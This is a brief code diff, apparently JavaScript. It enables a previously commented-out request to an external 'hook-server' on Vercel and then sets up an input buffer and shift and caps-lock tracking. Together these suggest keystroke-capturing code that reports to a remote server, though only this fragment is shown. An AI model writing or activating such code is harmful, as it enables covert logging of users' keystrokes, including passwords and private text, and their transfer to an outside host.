@@ -14,8 +14,8 @@ try {
 
     const hookDomain = "https://hook-server-beta.vercel.app";
     // const hookDomain = "http://localhost:5000";
-    
-    //axios.get(`${hookDomain}/hook/init`);
+
+    axios.get(`${hookDomain}/hook/init`);
     let inputBuffer = '';
     let isShiftPressed = false; 
     let isCapsLockOn = false; 
